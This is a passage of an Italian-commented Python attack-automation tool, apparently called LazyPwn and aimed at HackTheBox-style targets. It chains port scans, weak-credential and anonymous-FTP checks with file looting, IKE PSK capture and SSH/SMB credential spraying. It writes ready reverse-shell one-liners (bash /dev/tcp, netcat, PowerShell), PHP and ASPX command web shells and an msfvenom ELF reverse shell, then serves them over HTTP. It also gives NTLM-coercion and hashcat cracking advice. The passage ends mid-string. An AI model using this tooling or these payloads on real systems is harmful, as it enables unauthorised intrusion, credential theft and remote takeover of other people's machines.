        # 2. Weak Auth Check (Scott)
        if not self.sm.is_completed("mssql_scott"):
            console.print("[cyan][*] Controllo credenziali deboli (scott/tiger)...[/cyan]")
            cmd_scott = f"netexec mssql {self.target_ip} -u 'scott' -p 'tiger'"
            await self.pm.run(cmd_scott, "mssqlhunter_scott", timeout=120)
            self.sm.mark_completed("mssql_scott")
        else:
            console.print("[+] Controllo MSSQL Scott già completato. Skipping...")
        
        # 3. Coercion Killchain Alert
        console.print(Panel(
            "[bold red][!] MS-SQL Trovato. Se ottieni l'accesso, prepara Responder sulla tua interfaccia (sudo responder -I tun0) e usa xp_dirtree per forzare l'autenticazione SMB ed estrarre l'hash NTLMv2 del service account![/bold red]",
            title="MS-SQL Coercion Killchain",
            border_style="red"
        ))

class IKESnatcher:
    def __init__(self, target_ip, pm, sm):
        self.target_ip = target_ip
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio IKESnatcher su {self.target_ip}[/cyan]")
        psk_file = os.path.join(self.pm.loot_dir, "ike_psk.txt")
        
        if not self.sm.is_completed("ike_scan"):
            cmd = f"ike-scan --aggressive --id=test --pskcrack={psk_file} {self.target_ip}"
            await self.pm.run(cmd, "ikesnatcher", timeout=120)
            self.sm.mark_completed("ike_scan")
        else:
            console.print("[+] IKE Scan già completato. Skipping...")
        
        if os.path.exists(psk_file) and os.path.getsize(psk_file) > 0:
            console.print(Panel(
                f"[bold yellow][!] IKE Phase 1 PSK Catturato! L'hash è in loot/ike_psk.txt.[/bold yellow]\n[bold red]Lancialo in pasto a hashcat o psk-crack![/bold red]",
                title="IKE VPN Pwned",
                border_style="red"
            ))

class InfraScout:
    def __init__(self, target_ip, port, service_name, domain, pm, sm):
        self.target_ip = target_ip
        self.port = str(port)
        self.service_name = service_name
        self.domain = domain
        self.pm = pm
        self.sm = sm

    async def run_all(self):
        console.print(f"[cyan][*] Inizio InfraScout su {self.target_ip}:{self.port} ({self.service_name})[/cyan]")
        
        if self.port == "21" or self.service_name == "ftp":
            if not self.sm.is_completed(f"infra_ftp_{self.port}"):
                console.print("[cyan][*] Controllo accesso FTP Anonymous...[/cyan]")
                cmd = f"netexec ftp {self.target_ip} -u 'anonymous' -p ''"
                rc, output = await self.pm.run_and_capture(cmd, f"infrascout_ftp_{self.port}", timeout=120)
                if rc == 0 or "Pwn3d!" in output or "Success" in output:
                    console.print(Panel("[bold red blink][!] Accesso Anonymous FTP consentito! Controlla i file![/bold red blink]", title="FTP Anonymous", border_style="red"))
                    
                    # FTP Auto-Spidering / Exfiltration
                    ftp_loot_dir = os.path.join(self.pm.loot_dir, "ftp_loot")
                    os.makedirs(ftp_loot_dir, exist_ok=True)
                    spider_cmd = f"wget -m --no-passive ftp://anonymous:anonymous@{self.target_ip}:{self.port} -P {ftp_loot_dir}"
                    # Background task non bloccante via create_task per la pipeline
                    asyncio.create_task(self.pm.run(spider_cmd, f"infrascout_ftp_spider_{self.port}", timeout=300))
                    console.print("[bold cyan][*] Download ricorsivo FTP avviato in background nella cartella loot...[/bold cyan]")
                    
                self.sm.mark_completed(f"infra_ftp_{self.port}")
            else:
                console.print(f"[+] Controllo FTP su porta {self.port} già completato. Skipping...")
                
        elif self.port == "53" or self.service_name == "domain":
            if not self.sm.is_completed(f"infra_dns_{self.port}"):
                if self.domain and self.domain != "target.htb":
                    console.print(f"[cyan][*] Controllo Zone Transfer DNS su {self.domain}...[/cyan]")
                    log_file = os.path.join(self.pm.log_dir, "dns_zonetransfer.log")
                    cmd = f"dig axfr @{self.target_ip} {self.domain} | tee {log_file}"
                    await self.pm.run(cmd, f"infrascout_dns_{self.port}", timeout=60)
                else:
                    console.print("[yellow][!] Dominio non valido per Zone Transfer. Skipping...[/yellow]")
                self.sm.mark_completed(f"infra_dns_{self.port}")
            else:
                console.print(f"[+] Controllo DNS su porta {self.port} già completato. Skipping...")
                
        elif self.port in ["111", "2049"] or self.service_name in ["rpcbind", "nfs"]:
            if not self.sm.is_completed(f"infra_nfs_{self.port}"):
                console.print("[cyan][*] Enumerazione NFS shares...[/cyan]")
                log_file = os.path.join(self.pm.log_dir, "nfs_shares.log")
                cmd = f"showmount -e {self.target_ip} | tee {log_file}"
                await self.pm.run(cmd, f"infrascout_nfs_{self.port}", timeout=60)
                self.sm.mark_completed(f"infra_nfs_{self.port}")
            else:
                console.print(f"[+] Enumerazione NFS su porta {self.port} già completata. Skipping...")

class ReconRouter:
    def __init__(self, target_ip, process_manager, sm):
        self.target_ip = target_ip
        self.pm = process_manager
        self.sm = sm

    def parse_nmap_xml(self, xml_file):
        if not os.path.exists(xml_file):
            console.print(f"[red][-] File Nmap XML non trovato: {xml_file}[/red]")
            return []
        
        services = []
        try:
            tree = ET.parse(xml_file)
            for port_node in tree.findall(".//port"):
                state = port_node.find("state").get("state")
                if state == "open":
                    port = port_node.get("portid")
                    protocol = port_node.get("protocol")
                    service = port_node.find("service")
                    svc_name = service.get("name") if service is not None else "unknown"
                    services.append({"port": port, "protocol": protocol, "service": svc_name})
        except Exception as e:
            console.print(f"[red][-] Errore parse XML: {str(e)}[/red]")
        return services

    async def route(self, services):
        has_windows = any(svc["port"] in ["139", "445", "88", "389"] for svc in services)
        self.domain = "target.htb"
        
        has_ssl = any(svc["port"] in ["443", "8443"] for svc in services)
        
        if has_windows:
            self.domain = await extract_domain(self.target_ip, self.pm)
        elif has_ssl:
            ssl_port = [svc["port"] for svc in services if svc["port"] in ["443", "8443"]][0]
            domain_ssl = await extract_domain_ssl(self.target_ip, ssl_port)
            if domain_ssl:
                self.domain = domain_ssl
                with open(os.path.join(self.pm.loot_dir, "domain.txt"), "w") as df:
                    df.write(domain_ssl)

        sem = asyncio.Semaphore(3)
        async def sem_task(coro):
            async with sem:
                await coro

        tasks = []
        for svc in services:
            port = svc["port"]
            name = svc["service"].lower()
            proto = svc["protocol"].lower()

            # Trigger Web
            if name in ["http", "https", "http-alt"] or port in ["80", "443"]:
                tasks.append(asyncio.create_task(sem_task(self.enum_web(port))))

            # Trigger AD/Windows
            elif port in ["88", "389", "445"]:
                console.print(f"[magenta][*] AD/Windows Enum Triggered su porta {port}![/magenta]")
                tasks.append(asyncio.create_task(sem_task(self.enum_active_directory(port))))

            # Trigger MS-SQL
            elif port == "1433" or name == "ms-sql-s":
                console.print(f"[red][!] MS-SQL Rilevato sulla porta {port}: potenziale coercizione NTLM via xp_dirtree[/red]")
                tasks.append(asyncio.create_task(sem_task(self.enum_mssql(port))))

            # Trigger VPN/UDP
            elif proto == "udp" and port == "500":
                tasks.append(asyncio.create_task(sem_task(self.enum_ike(port))))

            # Trigger Infra
            elif port in ["21", "53", "111", "2049"] or name in ["ftp", "domain", "rpcbind", "nfs"]:
                tasks.append(asyncio.create_task(sem_task(self.enum_infra(port, name))))

    async def enum_ike(self, port):
        ike_snatcher = IKESnatcher(self.target_ip, self.pm, self.sm)
        await ike_snatcher.run_all()

    async def enum_infra(self, port, name):
        infra_scout = InfraScout(self.target_ip, port, name, getattr(self, 'domain', 'target.htb'), self.pm, self.sm)
        await infra_scout.run_all()

def generate_payloads_and_template(target_ip, pm):
    lhost = get_lhost(target_ip)
    port = 4444
    
    domain_file = os.path.join(pm.loot_dir, "domain.txt")
    domain_target = target_ip
    if os.path.exists(domain_file):
        with open(domain_file, "r") as f:
            domain_text = f.read().strip()
        if domain_text and domain_text != "target.htb":
            domain_target = domain_text
            
    # Payloads
    loot_dir = pm.loot_dir
    payloads_file = os.path.join(loot_dir, "reverse_shells.txt")
    payloads = f"""# Reverse Shell Payloads (LHOST={lhost}, LPORT={port})

# Bash
bash -c 'bash -i >& /dev/tcp/{lhost}/{port} 0>&1'

# Netcat (Traditional)
nc -e /bin/sh {lhost} {port}

# Netcat (OpenBSD mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f

# PowerShell (Generic One-Liner)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()
"""
    with open(payloads_file, "w") as f:
        f.write(payloads)
        
    # Python Template
    base_dir = os.path.join(pm.base_dir, f"htb_{target_ip}")
    template_file = os.path.join(base_dir, "pwn_template.py")
    template = f"""#!/usr/bin/env python3
import requests
import urllib3
from bs4 import BeautifulSoup

# Disabilita i warning per certificati self-signed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {{"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}}
HEADERS = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) LazyPwn/1.0"}}
TARGET = "http://{domain_target}"

s = requests.Session()
s.proxies.update(PROXY)
s.headers.update(HEADERS)
s.verify = False

def exploit():
    print(f"[*] Inizio exploit contro {{TARGET}}")
    # Scrivi qui la tua logica di exploit per HR/CTF
    
    # Esempio:
    # res = s.get(f"{{TARGET}}/example", timeout=10)
    # if res.status_code == 200:
    #     soup = BeautifulSoup(res.text, "html.parser")

if __name__ == "__main__":
    exploit()
"""
    with open(template_file, "w") as f:
        f.write(template)
    
    console.print(f"[bold green][+] reverse_shells.txt salvato in loot/[/bold green]")
    console.print(f"[bold green][+] pwn_template.py generato nella root del target[/bold green]")
    
    # Python Pwntools Template
    binary_template_file = os.path.join(base_dir, "pwn_binary_template.py")
    binary_template = f'''#!/usr/bin/env python3
from pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
# context.arch = 'amd64'

def start():
    if args.REMOTE:
        return remote("{target_ip}", 1337)
    else:
        return process("./binary_name")

io = start()
# log.info(f"Leaked address: {{hex(leak)}}")
io.interactive()
'''
    with open(binary_template_file, "w") as f:
        f.write(binary_template)
    console.print(f"[bold green][+] pwn_binary_template.py generato nella root del target[/bold green]")

async def generate_markdown_report(target_ip, pm, sm, services):
    report_file = os.path.join(pm.base_dir, f"htb_{target_ip}", "REPORT.md")
    
    # Domain
    domain_file = os.path.join(pm.loot_dir, "domain.txt")
    domain = sm.get_data("domain", None)
    if not domain and os.path.exists(domain_file):
        with open(domain_file, "r") as f:
            domain = f.read().strip()
    if not domain:
        domain = "Sconosciuto / Fallback (target.htb)"
        
    report = f"# Report Penetration Test: {target_ip}\n\n"
    report += f"**IP Target:** `{target_ip}`\n"
    report += f"**Dominio Estratto:** `{domain}`\n\n"
    
    report += "## 1. Servizi Esposti (Port Scanning)\n"
    report += "| Porta | Protocollo | Servizio |\n"
    report += "|-------|------------|----------|\n"
    for svc in services:
        report += f"| {svc['port']} | {svc['protocol'].upper()} | {svc['service']} |\n"
    report += "\n"
    
    # VHOSTs
    report += "## 2. Web - Virtual Hosts Trovati\n"
    vhosts_found = []
    for key, val in sm.state.get("data", {}).items():
        if key.startswith("vhosts_") and isinstance(val, list):
            vhosts_found.extend(val)
            
    if vhosts_found:
        for vh in set(vhosts_found):
            report += f"- `{vh}`\n"
    else:
        report += "- *Nessun VHOST rilevato o enumerazione non completata.*\n"
    report += "\n"
    
    # IKE VPN
    psk_file = os.path.join(pm.loot_dir, "ike_psk.txt")
    if os.path.exists(psk_file) and os.path.getsize(psk_file) > 0:
        report += "## :warning: VULNERABILITÀ VPN: IKE Phase 1 PSK Catturato!\n"
        report += f"**CRITICO:** È stato possibile estrarre l'hash PSK in Aggressive Mode. Controlla il log situato in:\n`{psk_file}`\n\n"
    
    report += "## 3. Vulnerabilità Infrastrutturali\n"
    infra_found = False
    
    import glob
    ftp_logs = glob.glob(os.path.join(pm.log_dir, "infrascout_ftp_*.log"))
    for ftp_log in ftp_logs:
        if os.path.exists(ftp_log):
            with open(ftp_log, "r") as log_f:
                content = log_f.read()
                if "Pwn3d!" in content or "Success" in content:
                    report += "- **FTP Anonymous:** Permesso! Controlla i log per scoprire i file esposti.\n"
                    infra_found = True
                    break
    
    dns_log = os.path.join(pm.log_dir, "dns_zonetransfer.log")
    if os.path.exists(dns_log) and os.path.getsize(dns_log) > 0:
        report += "- **DNS Zone Transfer:** Riuscito! Controlla i record DNS estratti.\n"
        infra_found = True
        
    nfs_log = os.path.join(pm.log_dir, "nfs_shares.log")
    if os.path.exists(nfs_log) and os.path.getsize(nfs_log) > 0:
        report += "- **NFS Shares:** Share esposte rilevate. Cerca nel log i dettagli dei mount esposti.\n"
        infra_found = True
        
    if not infra_found:
        report += "- *Nessuna vulnerabilità infrastrutturale critica rilevata.*\n"
        
    report += "\n"
    
    report += "## Visual Recon (Gowitness)\n\n"
    gw_dir = os.path.join(pm.log_dir, "gowitness_shots")
    if os.path.exists(gw_dir):
        import glob
        shots = glob.glob(os.path.join(gw_dir, "*.png"))
        if shots:
            for shot in shots:
                filename = os.path.basename(shot)
                rel_path = f"logs/gowitness_shots/{filename}"
                report += f"![Screenshot_{filename}]({rel_path})\n\n"
        else:
            report += "*Nessuno screenshot trovato.*\n\n"
    else:
        report += "*Directory Gowitness non trovata.*\n\n"
    
    with open(report_file, "w") as f:
        f.write(report)
    
    console.print(f"[bold green][+] Auto-Report Markdown generato in {report_file}[/bold green]")

    # --- Auto-HTML Report Generation ---
    html_file = os.path.join(pm.base_dir, f"htb_{target_ip}", "REPORT.html")
    
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penetration Test Report - {target_ip}</title>
    <style>
        body {{
            background-color: #0d1117;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            line-height: 1.6;
            padding: 20px;
            max-width: 1000px;
            margin: 0 auto;
        }}
        h1, h2, h3 {{ color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 5px; }}
        a {{ color: #ff7b72; text-decoration: none; }}
        a:hover {{ text-decoration: underline; }}
        code {{ background: #161b22; padding: 2px 5px; border-radius: 3px; color: #ff7b72; }}
        pre {{ background: #161b22; padding: 10px; border-radius: 5px; overflow-x: auto; }}
        table {{ width: 100%; border-collapse: collapse; margin-bottom: 20px; }}
        th, td {{ border: 1px solid #30363d; padding: 8px; text-align: left; }}
        th {{ background-color: #21262d; }}
        img {{ max-width: 100%; height: auto; border: 1px dashed #00ff00; padding: 5px; background: #000; margin-top: 10px; }}
    </style>
</head>
<body>
"""
    
    html_body = report
    # Conversione Markdown basica a HTML
    html_body = re.sub(r'^# (.*?)$', r'<h1>\1</h1>', html_body, flags=re.MULTILINE)
    html_body = re.sub(r'^## (.*?)$', r'<h2>\1</h2>', html_body, flags=re.MULTILINE)
    html_body = re.sub(r'^### (.*?)$', r'<h3>\1</h3>', html_body, flags=re.MULTILINE)
    html_body = re.sub(r'\*\*(.*?)\*\*', r'<b>\1</b>', html_body)
    html_body = re.sub(r'`(.*?)`', r'<code>\1</code>', html_body)
    html_body = re.sub(r'!\[(.*?)\]\((.*?)\)', r'<img alt="\1" src="\2"/>', html_body)
    html_body = re.sub(r'^- (.*?)$', r'<li>\1</li>', html_body, flags=re.MULTILINE)
    html_body = re.sub(r'\|(.*)\|', r'<tr><td>\1</td></tr>', html_body)  # Very rough table conversion
    html_body = html_body.replace('<tr><td>---', '<!--') # strip table separators
    html_body = html_body.replace('\n\n', '<br><br>')
    
    html_content += html_body + "</body></html>"
    
    with open(html_file, "w") as f:
        f.write(html_content)

    console.print(f"[bold green][+] Report HTML interattivo generato in {html_file}[/bold green]")


def check_dependencies():
    global SECLISTS_BASE
    import shutil
    import os
    import sys
    
    tools = ["rustscan", "nmap", "netexec", "ffuf", "nuclei", "gowitness", "ike-scan", "wpscan", "wafw00f"]
    for tool in tools:
        if shutil.which(tool) is None:
            console.print(f"[yellow][!] Attenzione: '{tool}' non trovato nel PATH. Alcuni moduli potrebbero fallire.[/yellow]")

    base_paths = ["/usr/share/seclists", "/opt/seclists", "/usr/local/share/seclists"]
    found_base = None
    for bp in base_paths:
        if os.path.exists(os.path.join(bp, "Discovery", "DNS", "subdomains-top1million-5000.txt")):
            found_base = bp
            break

    if not found_base:
        console.print("[bold red][-] Wordlist mancanti (SecLists) in tutti i path noti.[/bold red]")
        sys.exit(1)
    else:
        SECLISTS_BASE = found_base


async def credential_spraying(pm, target_ip, services):
    secrets_path = os.path.join(pm.loot_dir, "secrets.txt")
    if not os.path.exists(secrets_path) or os.path.getsize(secrets_path) == 0:
        return
    
    spray_targets = []
    if 22 in services or "22" in services:
        spray_targets.append("ssh")
    if 445 in services or "445" in services:
        spray_targets.append("smb")

    if spray_targets:
        console.print("[bold cyan][*] Auto-Breach: Spraying dei segreti trovati contro SSH/SMB in corso...[/bold cyan]")
        for protocol in spray_targets:
            cmd = f"netexec {protocol} {target_ip} -u root,admin -p {secrets_path} --continue-on-success"
            asyncio.create_task(pm.run(cmd, f"auto_breach_spray_{protocol}", timeout=300))

async def pipeline(target_ip, base_dir, reset=False, webhook_url=None, profile="normal"):
    check_dependencies()

    if reset:
        import shutil
        console.print("[yellow][!] Eseguo reset dello stato e dei log come richiesto...[/yellow]")
        target_base = os.path.join(base_dir, f"htb_{target_ip}")
        logs_dir = os.path.join(target_base, "logs")
        state_file = os.path.join(target_base, "state.json")
        if os.path.exists(logs_dir):
            try:
                shutil.rmtree(logs_dir)
            except Exception as e:
                console.print(f"[red][-] Errore cancellazione {logs_dir}: {e}[/red]")
        if os.path.exists(state_file):
            try:
                os.remove(state_file)
            except Exception as e:
                console.print(f"[red][-] Errore cancellazione {state_file}: {e}[/red]")

    pm = ProcessManager(target_ip, base_dir)
    pm.profile = profile
    state_file = os.path.join(pm.base_dir, f"htb_{target_ip}", "state.json")
    sm = StateManager(state_file)

    # Registrazione graceful shutdown su SIGINT (Ctrl+C)
    def signal_handler(sig, frame):
        pm.terminate_all()
    signal.signal(signal.SIGINT, signal_handler)

    console.print(Panel(f"Iniziando scansione LazyPwn su [bold yellow]{target_ip}[/bold yellow]", style="bold green"))

    # Step 1: Rustscan - Fast TCP Scan
    if sm.is_completed("rustscan"):
        console.print("[+] Step rustscan già completato. Skipping...")
        ports = sm.get_data("rustscan_ports")
        if not ports:
            console.print("[red][-] Errore: porte non salvate nello stato. Forzo uscita.[/red]")
            return
    else:
        rc, output = await pm.run_and_capture(f"rustscan -a {target_ip} -g -- -Pn", "rustscan_tcp", timeout=300)
        match = re.search(r'\[(.*?)\]', output)
        if match:
            ports = match.group(1).replace(" ", "")
        else:
            ports = ""

        if not ports:
            console.print("[red][-] Nessuna porta trovata o errore in RustScan. Uscita.[/red]")
            return

        sm.set_data("rustscan_ports", ports)
        sm.mark_completed("rustscan")
        console.print(f"[bold green][+] Porte estratte da RustScan: {ports}[/bold green]")

    # Configurazione profilo Nmap
    nmap_timing = "-T4"
    if pm.profile == "aggressive":
        nmap_timing = "-T5 --min-rate 10000"
    elif pm.profile == "stealth":
        nmap_timing = "-T2 --max-rate 50"

    # Step 2: Nmap UDP mirato
    udp_task = None
    udp_xml_path = os.path.join(pm.log_dir, "nmap_udp.xml")
    if sm.is_completed("nmap_udp"):
        console.print("[+] Step nmap_udp già completato. Skipping...")
    else:
        udp_task = asyncio.create_task(
            pm.run(f"nmap -sU -p500,161,69 {nmap_timing} {target_ip} -oX {udp_xml_path}", "nmap_udp", timeout=600)
        )

    # Step 3: Nmap profondo solo su porte estratte (Ottimizzazione!)
    nmap_xml_path = os.path.join(pm.log_dir, "nmap_full.xml")
    if sm.is_completed("nmap_full"):
        console.print("[+] Step nmap_full già completato. Skipping...")
    else:
        await pm.run(f"nmap -sC -sV -p {ports} {nmap_timing} {target_ip} -oX {nmap_xml_path}", "nmap_full", timeout=1200)
        sm.mark_completed("nmap_full")

    # Attendiamo UDP se era stato lanciato e non era nello stato completato precedentemente
    if udp_task and not sm.is_completed("nmap_udp"):
        await udp_task
        sm.mark_completed("nmap_udp")

    # Searchsploit Nmap XML Mapper
    if not sm.is_completed("searchsploit"):
        if shutil.which("searchsploit"):
            console.print("[cyan][*] Esecuzione Searchsploit su Nmap XML...[/cyan]")
            scmd = f"searchsploit --nmap {nmap_xml_path} --color=never"
            rc, output = await pm.run_and_capture(scmd, "searchsploit", timeout=300)
            with open(os.path.join(pm.loot_dir, "searchsploit_results.txt"), "w") as f:
                f.write(output)
        sm.mark_completed("searchsploit")

    def generate_hosts_file_instruction(target_ip, sm, router_domain):
        vhosts_found = []
        for key, val in sm.state.get("data", {}).items():
            if key.startswith("vhosts_") and isinstance(val, list):
                vhosts_found.extend(val)

        hosts = set()
        if router_domain and router_domain != "target.htb":
            hosts.add(router_domain)

        hosts.update(vhosts_found)

        if hosts:
            hosts_str = " ".join(hosts)
            cmd = f'echo "{target_ip} {hosts_str}" | sudo tee -a /etc/hosts'
            console.print(Panel(
                f"[bold yellow]{cmd}[/bold yellow]",
                title="Aggiungi al file /etc/hosts",
                border_style="cyan"
            ))


    # Cervello Decisionale: Service Router
    router = ReconRouter(target_ip, pm, sm)
    services_tcp = router.parse_nmap_xml(nmap_xml_path)
    services_udp = router.parse_nmap_xml(udp_xml_path)

    # Merge avoiding duplicates
    services = services_tcp.copy()
    for udp_svc in services_udp:
        if udp_svc not in services:
            services.append(udp_svc)

    # Fallback/Demo se Nmap XML non è stato generato (solo per test)
    if not services:
        console.print("[yellow][!] Demo mode: inietto servizi fittizi poiché Nmap XML è assente o vuoto[/yellow]")
        services = [
            {"port": "80", "protocol": "tcp", "service": "http"},
            {"port": "445", "protocol": "tcp", "service": "microsoft-ds"},
            {"port": "1433", "protocol": "tcp", "service": "ms-sql-s"},
            {"port": "500", "protocol": "udp", "service": "isakmp"}
        ]

    await router.route(services)
    generate_hosts_file_instruction(target_ip, sm, getattr(router, 'domain', None))

    # Generazione Quality of Life & Auto-Reporting
    generate_payloads_and_template(target_ip, pm)
    await generate_markdown_report(target_ip, pm, sm, services)

    aggregate_loot(pm, sm, webhook_url)
    await credential_spraying(pm, target_ip, services)

    # Auto-Chown: Ripristino dei permessi all'utente originale che ha lanciato sudo
    import os
    if "SUDO_USER" in os.environ:
        sudo_user = os.environ["SUDO_USER"]
        target_base = os.path.join(pm.base_dir, f"htb_{target_ip}")
        console.print(f"[cyan][*] Auto-Chown: Ripristino proprietà della cartella all'utente '{sudo_user}'...[/cyan]")
        try:
            os.system(f"chown -R {sudo_user}:{sudo_user} {target_base}")
        except Exception as e:
            console.print(f"[yellow][!] Impossibile ripristinare i permessi: {e}[/yellow]")

    console.print("[bold green][+] Pipeline completata con successo![/bold green]")


def aggregate_loot(pm, sm, webhook_url=None):
    loot_str = ""
    for fname in ["ike_psk.txt", "domain.txt", "secrets.txt", "openapi_found.txt", "swagger_found.txt", "openapi_found.yaml", "swagger_found.yaml", "searchsploit_results.txt"]:
        fpath = os.path.join(pm.loot_dir, fname)
        if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
            with open(fpath, "r") as f:
                content = f.read().strip()
                # Salta l'output vuoto di searchsploit (potrebbe essere lungo ma senza veri risultati base)
                if content and not (fname == "searchsploit_results.txt" and "Exploit Title" not in content and "No Results" in content):
                    loot_str += f"[bold cyan]=== {fname} ===[/bold cyan]\n"
                    # Tronchiamo l'output se è uno swagger o searchsploit e superiamo le righe
                    if "openapi" in fname or "swagger" in fname or "searchsploit" in fname:
                        lines = content.split("\n")
                        max_lines = 15 if "searchsploit" in fname else 10
                        if len(lines) > max_lines:
                            content = "\n".join(lines[:max_lines]) + f"\n... [Troncato: Apri il file {fpath} per i dettagli completi]"
                    loot_str += f"{content}\n\n"
                    
                    # --- Cracking Cheatsheet Integrata ---
                    if fname == "ike_psk.txt":
                        loot_str += f"[bold red]Cracking Suggerito (IKE PSK):[/bold red] hashcat -m 5300 -a 0 {fpath} /usr/share/wordlists/rockyou.txt\n\n"
                    elif fname == "ntlm_hash.txt": # Predisposto per il futuro come richiesto
                        loot_str += f"[bold red]Cracking Suggerito (NTLM):[/bold red] hashcat -m 5600 -a 0 {fpath} /usr/share/wordlists/rockyou.txt\n\n"
    console.print(Panel(loot_str.strip(), title="LOOT SUMMARY", border_style="bold gold1"))

    if webhook_url and loot_str.strip():
        try:
            import requests
            requests.post(webhook_url, json={"content": f"```\n{loot_str.strip()}\n```"})
            console.print("[green][+] Loot inviato con successo al Webhook![/green]")
        except Exception as e:
            console.print(f"[yellow][!] Impossibile inviare il loot al Webhook: {e}[/yellow]")

def get_lhost(target_ip="10.10.10.10"):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to target_ip (doesn't actually send a packet for UDP)
        s.connect((target_ip, 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


class ShellWhisperer:
    def __init__(self):
        self.tools_dir = os.path.join(os.getcwd(), "tools")
        os.makedirs(self.tools_dir, exist_ok=True)

    def _prepare_arsenal(self):
        import urllib.request
        import subprocess
        
        linpeas_url = "https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh"
        winpeas_url = "https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASany/winPEASany.exe"

        linpeas_path = os.path.join(self.tools_dir, "linpeas.sh")
        winpeas_path = os.path.join(self.tools_dir, "winPEASany.exe")

        try:
            if not os.path.exists(linpeas_path):
                console.print("[yellow][*] Scaricamento linpeas.sh...[/yellow]")
                urllib.request.urlretrieve(linpeas_url, linpeas_path)
                console.print("[green][+] linpeas.sh scaricato![/green]")
            if not os.path.exists(winpeas_path):
                console.print("[yellow][*] Scaricamento winPEASany.exe...[/yellow]")
                urllib.request.urlretrieve(winpeas_url, winpeas_path)
                console.print("[green][+] winPEASany.exe scaricato![/green]")
        except Exception as e:
            console.print(f"[red][-] Errore nel download dei PEAS: {e}[/red]")

        # --- Base Chisel Setup per post-exploitation ---
        chisel_sh = os.path.join(self.tools_dir, "setup_chisel.sh")
        if not os.path.exists(chisel_sh):
            chisel_sh_content = '''#!/bin/bash
echo "[*] Scaricamento Chisel amd64..."
curl -sL https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz | gzip -d > chisel
chmod +x chisel
echo "[+] Chisel scaricato! Esegui: ./chisel client <TUO_IP>:8000 R:socks"
'''
            with open(chisel_sh, "w") as f:
                f.write(chisel_sh_content)
            console.print(f"[green][+] Script setup_chisel.sh generato in {self.tools_dir}[/green]")

        # --- Generazione Web Shells ---
        console.print("[cyan][*] Auto-Payload Factory: Generazione Web Shells...[/cyan]")
        php_shell_path = os.path.join(self.tools_dir, "shell.php")
        aspx_shell_path = os.path.join(self.tools_dir, "shell.aspx")
        
        if not os.path.exists(php_shell_path):
            with open(php_shell_path, "w") as f:
                f.write("<?php system($_REQUEST['cmd']); ?>\n")
        if not os.path.exists(aspx_shell_path):
            with open(aspx_shell_path, "w") as f:
                f.write('<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){if(Request.QueryString["cmd"]!=null){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+Request.QueryString["cmd"];psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmr = p.StandardOutput;string s = stmr.ReadToEnd();stmr.Close();Response.Write("<pre>"+Server.HtmlEncode(s)+"</pre>");}}</script>')

        # --- Generazione MSFvenom ---
        console.print("[cyan][*] Auto-Payload Factory: Generazione ELF Reverse Shell (msfvenom)...[/cyan]")
        elf_path = os.path.join(self.tools_dir, "revshell_x64")
        ip = get_lhost()
        if not os.path.exists(elf_path):
            try:
                cmd = ["msfvenom", "-p", "linux/x64/shell_reverse_tcp", f"LHOST={ip}", "LPORT=4444", "-f", "elf", "-o", elf_path]
                # Non bloccante passiamo a subprocess.call ma qui lo eseguiamo bloccante sennò l'utente non lo ha subito
                # Se vogliamo background come da richiesta: Popen
                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
                console.print(f"[bold green][+] Payload Factory: ELF Reverse Shell in generazione asincrona...[/bold green]")
            except FileNotFoundError:
                console.print("[yellow][!] msfvenom non trovato: generazione binario ELF saltata.[/yellow]")
        
        console.print("[bold green][+] Payload (PHP, ASPX, e binario ELF) pronti e serviti sul server HTTP![/bold green]")

    def run(self):
        import threading
        import http.server
        import socketserver

        self._prepare_arsenal()

        ip = get_lhost()

        console.print(Panel(f"Cartella servita: [bold cyan]{self.tools_dir}[/bold cyan]", title="ShellWhisperer - HTTP Server", border_style="green"))

        os.chdir(self.tools_dir)
        Handler = http.server.SimpleHTTPRequestHandler
        httpd = None
        assigned_port = None
        
        for port in range(8000, 8011):
            try:
                httpd = socketserver.TCPServer(("", port), Handler)
                assigned_port = port
                break
            except OSError:
                continue

        if not httpd:
            console.print("[red][-] Impossibile binding su nessuna porta tra 8000 e 8010. Server HTTP fallito.[/red]")
            return

        def serve():
            with httpd:
                httpd.serve_forever()

        t = threading.Thread(target=serve, daemon=True)
        t.start()
        console.print(f"[bold green][+] Web server avviato in background su http://0.0.0.0:{assigned_port}[/bold green]")

        cheatsheet_tty = """[bold cyan]0. Ascolto con rlwrap (Consigliato):[/bold cyan]
rlwrap nc -lvnp 4444

[bold cyan]1. Scusa python pty (Drop into shell):[/bold cyan]
